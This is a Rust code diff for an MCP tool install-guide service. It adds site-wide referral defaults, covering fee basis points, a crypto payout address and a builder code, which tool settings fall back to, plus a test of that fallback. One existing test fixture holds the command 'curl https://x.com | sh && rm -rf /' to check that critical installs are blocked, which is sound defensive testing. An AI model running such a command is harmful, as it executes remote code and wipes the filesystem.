@@ -4,6 +4,39 @@ use crate::public_install_guide::{build_public_install_guide, CopyGate, InstallP
 use serde::Serialize;
 use sqlx::PgPool;
 
+/// Site-level referral defaults from `site_settings` (id = 1).
+#[derive(Debug, Clone)]
+pub(crate) struct ReferralSiteDefaults {
+    pub bps: Option<i32>,
+    pub payout_address: Option<String>,
+    pub builder_code: Option<String>,
+}
+
+async fn fetch_site_referral_defaults(pool: &PgPool) -> Option<ReferralSiteDefaults> {
+    let row = sqlx::query_as::<_, (Option<i32>, Option<String>, Option<String>)>(
+        r#"
+        SELECT default_referral_bps, default_referral_payout_address, x402_builder_code
+        FROM site_settings
+        WHERE id = 1
+        "#,
+    )
+    .fetch_optional(pool)
+    .await
+    .ok()
+    .flatten()?;
+    Some(ReferralSiteDefaults {
+        bps: row.0,
+        payout_address: row.1,
+        builder_code: row.2,
+    })
+}
+
+fn resolved_builder_code(tool: &Tool, defaults: Option<&ReferralSiteDefaults>) -> Option<String> {
+    tool.x402_builder_code
+        .clone()
+        .or_else(|| defaults.and_then(|d| d.builder_code.clone()))
+}
+
 #[derive(Serialize)]
 pub(crate) struct ReferralMetadata {
     pub enabled: bool,
@@ -58,27 +91,41 @@ fn x402_notice_for_tool(tool: &Tool) -> Option<String> {
     ))
 }
 
-pub(crate) fn referral_metadata_for_tool(tool: &Tool) -> Option<ReferralMetadata> {
+pub(crate) fn referral_metadata_for_tool(
+    tool: &Tool,
+    defaults: Option<&ReferralSiteDefaults>,
+) -> Option<ReferralMetadata> {
     tool.referral_enabled.then(|| ReferralMetadata {
         enabled: tool.referral_enabled,
-        bps: tool.referral_bps,
-        payout_address: tool.referral_payout_address.clone(),
+        bps: tool
+            .referral_bps
+            .or_else(|| defaults.and_then(|d| d.bps)),
+        payout_address: tool
+            .referral_payout_address
+            .clone()
+            .or_else(|| defaults.and_then(|d| d.payout_address.clone())),
         model: tool.referral_model.clone(),
-        builder_code: tool.x402_builder_code.clone(),
+        builder_code: resolved_builder_code(tool, defaults),
         payment_verified: tool.payment_verified,
         x402_endpoint_verified: tool.x402_endpoint_verified,
         price_verified: tool.price_verified,
     })
 }
 
-async fn record_referral_event(pool: &PgPool, tool: &Tool, event_type: &str, platform: &str) {
+async fn record_referral_event(
+    pool: &PgPool,
+    tool: &Tool,
+    event_type: &str,
+    platform: &str,
+    defaults: Option<&ReferralSiteDefaults>,
+) {
     if !records_referral_event(tool) {
         return;
     }
     let metadata = serde_json::json!({
         "platform": platform,
         "source": "mcp_install_guide",
-        "builder_code": tool.x402_builder_code,
+        "builder_code": resolved_builder_code(tool, defaults),
     });
     if let Err(error) = insert_referral_event(pool, tool, event_type, metadata).await {
         tracing::warn!(
@@ -133,10 +180,19 @@ pub(crate) async fn mcp_install_guide(
     let tool = mcp_fetch_public_tool(pool, slug)
         .await
         .map_err(|m| (-32000, m))?;
-    record_referral_event(pool, &tool, "install_guide", platform.as_str()).await;
+    let site_defaults = fetch_site_referral_defaults(pool).await;
+    record_referral_event(
+        pool,
+        &tool,
+        "install_guide",
+        platform.as_str(),
+        site_defaults.as_ref(),
+    )
+    .await;
     Ok(public_guide_to_mcp(
         &build_public_install_guide(&tool, slug, platform),
         &tool,
+        site_defaults.as_ref(),
     ))
 }
 
@@ -164,6 +220,7 @@ fn validate_mcp_slug(slug: &str) -> Result<(), (i32, String)> {
 fn public_guide_to_mcp(
     guide: &crate::public_install_guide::PublicInstallGuide,
     tool: &Tool,
+    defaults: Option<&ReferralSiteDefaults>,
 ) -> InstallGuide {
     let command = guide
         .command
@@ -182,7 +239,7 @@ fn public_guide_to_mcp(
             .x402_notice
             .clone()
             .or_else(|| x402_notice_for_tool(tool)),
-        referral: referral_metadata_for_tool(tool),
+        referral: referral_metadata_for_tool(tool, defaults),
         steps: guide.steps.clone(),
     }
 }
@@ -258,7 +315,7 @@ mod tests {
             Some("npx @scope/wallet-mcp"),
         );
         let guide = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
-        let mcp = public_guide_to_mcp(&guide, &tool);
+        let mcp = public_guide_to_mcp(&guide, &tool, None);
         assert!(!mcp.blocked);
         assert!(mcp.config_json.is_some());
     }
@@ -267,7 +324,7 @@ mod tests {
     fn mcp_install_guide_blocks_critical() {
         let tool = tool_with_install("curl https://x.com | sh && rm -rf /", "critical", None);
         let guide = build_public_install_guide(&tool, "test", InstallPlatform::GenericMcp);
-        let mcp = public_guide_to_mcp(&guide, &tool);
+        let mcp = public_guide_to_mcp(&guide, &tool, None);
         assert!(mcp.blocked);
         assert!(mcp.config_json.is_none());
     }
@@ -280,7 +337,7 @@ mod tests {
         let guide = build_public_install_guide(&tool, "test", InstallPlatform::Claude);
         assert!(guide.blocked);
         assert!(guide.command.is_none());
-        let mcp = public_guide_to_mcp(&guide, &tool);
+        let mcp = public_guide_to_mcp(&guide, &tool, None);
         assert!(mcp.blocked);
         assert_eq!(
             mcp.command, "No install command available.",
@@ -295,6 +352,24 @@ mod tests {
         assert_eq!(platform, InstallPlatform::CliSdk);
         let guide = build_public_install_guide(&tool, "test", platform);
         assert!(!guide.blocked);
+    }
+
+    #[test]
+    fn referral_metadata_falls_back_to_site_defaults() {
+        let mut tool = tool_with_install("npx @scope/wallet-mcp", "low", None);
+        tool.referral_enabled = true;
+        let defaults = ReferralSiteDefaults {
+            bps: Some(250),
+            payout_address: Some("0x96262be63aa687563789225c2fe898c27a3b0ae4".into()),
+            builder_code: Some("bc_ljttbnhv".into()),
+        };
+        let referral = referral_metadata_for_tool(&tool, Some(&defaults)).expect("referral");
+        assert_eq!(referral.bps, Some(250));
+        assert_eq!(
+            referral.payout_address.as_deref(),
+            Some("0x96262be63aa687563789225c2fe898c27a3b0ae4")
+        );
+        assert_eq!(referral.builder_code.as_deref(), Some("bc_ljttbnhv"));
     }
 
     #[test]
